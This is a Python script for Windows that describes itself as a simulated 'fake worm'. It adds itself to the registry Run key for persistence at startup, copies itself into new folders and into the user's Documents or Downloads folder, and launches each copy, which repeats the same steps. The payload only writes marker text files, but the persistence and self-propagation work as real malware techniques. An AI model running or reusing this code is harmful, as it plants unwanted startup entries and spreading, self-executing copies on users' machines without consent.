import os
import time
import platform
import shutil
import winreg as reg 
import subprocess
import sys
import random

#NOTE: Script must run as administrator.

# Setting the file to start every time it boots up, code from https://www.geeksforgeeks.org/autorun-a-python-script-on-windows-startup/
def AddToRegistry():
    try:
        # Get the directory where the script is executed
        pth = os.path.dirname(os.path.realpath(__file__))

        # Specify the name of the Python file with extension
        s_name = "PracticeOS.py"

        # Join the file name to the end of the path address
        address = os.path.join(pth, s_name)

        # Specify the registry key we want to change (HKEY_CURRENT_USER)
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        # Open the key to make changes
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

        # Modify the opened key by adding a new value
        reg.SetValueEx(open_key, "any_name", 0, reg.REG_SZ, address)

        # Close the opened key
        reg.CloseKey(open_key)

        print(f"Added {s_name} to Windows Registry startup.")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False


#Getting the system information
def get_system_details():
    # Printing details of the OS
    print("OS:", platform.system(), "| Version:", platform.version(), "| Architecture:", platform.machine())
    # Printing the node
    print("Network's node name:", platform.node())

#Creating the directory
def create_directory(directory):
    try:
        os.makedirs(directory)
        return True
    except FileExistsError:
        return False
#Copy the worm into the directory
def copy_worm(directory, worm_name):
    try:
        worm_path = os.path.abspath(worm_name)
        new_file_path = shutil.copy(worm_path, directory)
        a = subprocess.Popen(["python", new_file_path])
        a.wait(timeout=30)
        print(f"Worm execution completed for {new_file_path}")
        return True
    except (shutil.SameFileError, FileNotFoundError, subprocess.CalledProcessError):
        return False

#Creating the file with the fake worm
def create_files(directory, num_files):
    for i in range(num_files):
        file_path = os.path.join(directory, f"file_{i}.txt")
        with open(file_path, "w") as file:
            file.write("This file has been created by the fake worm")


#Propagate to random directories
def propagate(worm_name):
     #List of  windows common system directories
    common_dirs = [os.path.expanduser("~\\Documents"), os.path.expanduser("~\\Downloads")]

    #Choose a random destination directory
    destination_dir = random.choice(common_dirs)

    #Generate the full path for the worm
    new_file_path = os.path.join(destination_dir, os.path.basename(worm_name))

    #Check if the file already exists
    if not os.path.exists(new_file_path):
        try:
            shutil.copy(worm_name, new_file_path)
            print(f"Worm copied to {new_file_path}")
            return True
        except (shutil.SameFileError, FileNotFoundError):
            print(f"Error while copying worm to {new_file_path}")
            return False
    else:
        print(f"File already exists at {new_file_path}...")


def main():
    worm_name = os.path.basename(__file__)
    base_directory = os.path.join(os.getcwd(), "worm_simulated")
    

    for i in range(1, 6):
        directory = os.path.join(base_directory, f"folder_{i}")
        if create_directory(directory):
            if copy_worm(directory, worm_name):
                create_files(directory, 3)
                print(f"Directory {directory} is infected")
        propagate(worm_name)
        time.sleep(1)

if __name__ == "__main__":
    AddToRegistry()
    get_system_details()
    main()


